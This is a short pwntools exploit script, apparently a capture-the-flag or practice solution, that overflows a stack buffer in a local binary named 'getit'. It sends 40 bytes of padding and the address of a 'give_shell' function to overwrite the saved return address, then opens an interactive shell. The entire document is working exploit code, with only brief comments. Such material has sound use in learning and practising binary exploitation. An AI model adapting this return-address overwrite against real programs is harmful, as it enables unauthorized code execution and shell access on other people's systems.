from pwn import *

target = process("./getit")
#gdb.attach(target, gdbscript = 'b *0x4005f1')

payload = b""
payload += b"0"*40 # Padding to the return address
payload += p64(0x00000000004005b6) # Address of give_shell in least endian, will be new saved return address

# Send the payload
target.sendline(payload)

# Drop to an interactive shell to use the new shell
target.interactive()
